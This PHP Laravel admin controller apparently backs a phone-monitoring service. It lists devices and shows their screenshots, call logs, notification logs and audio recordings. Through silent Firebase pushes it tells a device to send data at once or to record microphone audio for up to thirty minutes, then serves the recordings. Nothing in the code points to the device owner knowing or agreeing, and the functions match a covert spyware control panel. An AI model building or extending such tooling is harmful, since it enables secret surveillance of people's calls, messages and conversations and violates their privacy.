<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\Device;
use App\Models\Screenshot;
use App\Models\CallLog;
use App\Models\ActivityLog;
use App\Services\FcmService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

class AdminController extends Controller
{
    /**
     * Admin dashboard - list all devices.
     */
    public function dashboard()
    {
        $devices = Device::withCount(['screenshots', 'callLogs'])
            ->orderByDesc('last_seen_at')
            ->get();

        $stats = [
            'total_devices' => Device::count(),
            'online_devices' => Device::where('status', 'online')->count(),
            'total_screenshots' => Screenshot::count(),
            'total_calls' => CallLog::count(),
        ];

        return view('admin.dashboard', compact('devices', 'stats'));
    }

    /**
     * View device detail with data timeline.
     */
    public function deviceDetail(Device $device)
    {
        $screenshots = $device->screenshots()
            ->orderByDesc('captured_at')
            ->paginate(20);

        $callLogs = $device->callLogs()
            ->orderByDesc('call_date')
            ->paginate(20);

        $activityLogs = $device->activityLogs()
            ->orderByDesc('event_at')
            ->limit(50)
            ->get();

        $notificationLogs = $device->notificationLogs()
            ->orderByDesc('posted_at')
            ->paginate(30, ['*'], 'notifications_page');

        $audioRecordings = $device->audioRecordings()
            ->orderByDesc('recorded_at')
            ->paginate(15, ['*'], 'audio_page');

        return view('admin.device-detail', compact('device', 'screenshots', 'callLogs', 'activityLogs', 'notificationLogs', 'audioRecordings'));
    }

    /**
     * Pull realtime data from a device via FCM.
     */
    public function pullRealtime(Device $device, FcmService $fcmService): JsonResponse
    {
        if (!$device->fcm_token) {
            return response()->json([
                'success' => false,
                'message' => 'Device has no FCM token registered.',
            ], 422);
        }

        $sent = $fcmService->sendSilentPush($device->fcm_token, 'pull_realtime');

        if ($sent) {
            // Log the admin pull event
            ActivityLog::create([
                'device_id' => $device->id,
                'event_type' => 'admin_pull',
                'metadata' => ['triggered_at' => now()->toIso8601String()],
                'event_at' => now(),
            ]);

            return response()->json([
                'success' => true,
                'message' => 'Pull command sent. Data will arrive shortly.',
            ]);
        }

        return response()->json([
            'success' => false,
            'message' => 'Failed to send FCM push.',
        ], 500);
    }

    /**
     * Toggle device active/inactive.
     */
    public function toggleDevice(Device $device): JsonResponse
    {
        $device->update(['is_active' => !$device->is_active]);

        return response()->json([
            'success' => true,
            'message' => $device->is_active ? 'Device activated.' : 'Device deactivated.',
            'is_active' => $device->is_active,
        ]);
    }

    /**
     * Delete a device and all its data.
     */
    public function deleteDevice(Device $device): JsonResponse
    {
        $device->delete();

        return response()->json([
            'success' => true,
            'message' => 'Device and all associated data deleted.',
        ]);
    }

    /**
     * API: Get device screenshots (for AJAX loading).
     */
    public function getScreenshots(Device $device, Request $request): JsonResponse
    {
        $query = $device->screenshots()->orderByDesc('captured_at');

        if ($request->has('trigger_type')) {
            $query->where('trigger_type', $request->trigger_type);
        }

        if ($request->has('date')) {
            $query->whereDate('captured_at', $request->date);
        }

        $screenshots = $query->paginate(20);

        return response()->json([
            'success' => true,
            'data' => $screenshots,
        ]);
    }

    /**
     * API: Get call logs (for AJAX loading).
     */
    public function getCallLogs(Device $device, Request $request): JsonResponse
    {
        $query = $device->callLogs()->orderByDesc('call_date');

        if ($request->has('source')) {
            $query->where('source', $request->source);
        }

        $callLogs = $query->paginate(30);

        return response()->json([
            'success' => true,
            'data' => $callLogs,
        ]);
    }

    /**
     * Serve a screenshot file securely (authenticated proxy).
     */
    public function serveScreenshot(Screenshot $screenshot)
    {
        $path = storage_path('app/private/' . $screenshot->file_path);

        if (!file_exists($path)) {
            abort(404, 'Screenshot not found.');
        }

        return response()->file($path);
    }

    /**
     * Request dynamic voice/audio recording via FCM.
     */
    public function requestAudio(Device $device, Request $request, FcmService $fcmService): JsonResponse
    {
        $request->validate([
            'duration_seconds' => 'required|integer|min:5|max:1800',
        ]);

        if (!$device->fcm_token) {
            return response()->json([
                'success' => false,
                'message' => 'Device has no FCM token registered.',
            ], 422);
        }

        $duration = (int) $request->duration_seconds;

        $sent = $fcmService->sendSilentPush($device->fcm_token, 'record_audio', [
            'duration_seconds' => $duration
        ]);

        if ($sent) {
            ActivityLog::create([
                'device_id' => $device->id,
                'event_type' => 'request_audio',
                'metadata' => [
                    'duration_seconds' => $duration,
                    'requested_at' => now()->toIso8601String(),
                ],
                'event_at' => now(),
            ]);

            return response()->json([
                'success' => true,
                'message' => "Audio recording request sent. Audio will be recorded for {$duration} seconds and uploaded.",
            ]);
        }

        return response()->json([
            'success' => false,
            'message' => 'Failed to send FCM push.',
        ], 500);
    }

    /**
     * Serve a recorded audio file securely (authenticated proxy).
     */
    public function serveAudio(\App\Models\AudioRecording $recording)
    {
        $filePath = $recording->file_path;
        $path = storage_path('app/private/' . $filePath);

        // Fallback 1: Check if stored in public folder
        if (!file_exists($path)) {
            $fallbackPublic = storage_path('app/public/' . $filePath);
            if (file_exists($fallbackPublic)) {
                $path = $fallbackPublic;
            }
        }

        // Fallback 2: Handle duplicate 'private/' prefix from earlier versions
        if (!file_exists($path)) {
            if (str_starts_with($filePath, 'private/')) {
                $strippedPath = substr($filePath, 8); // remove 'private/'
                $fallbackPrivate = storage_path('app/private/' . $strippedPath);
                if (file_exists($fallbackPrivate)) {
                    $path = $fallbackPrivate;
                }
            }
        }

        if (!file_exists($path)) {
            abort(404, 'Audio recording not found.');
        }

        $mime = mime_content_type($path) ?: 'audio/mp4';

        return response()->file($path, [
            'Content-Type' => $mime,
            'Content-Disposition' => 'inline; filename="' . basename($path) . '"',
        ]);
    }
}
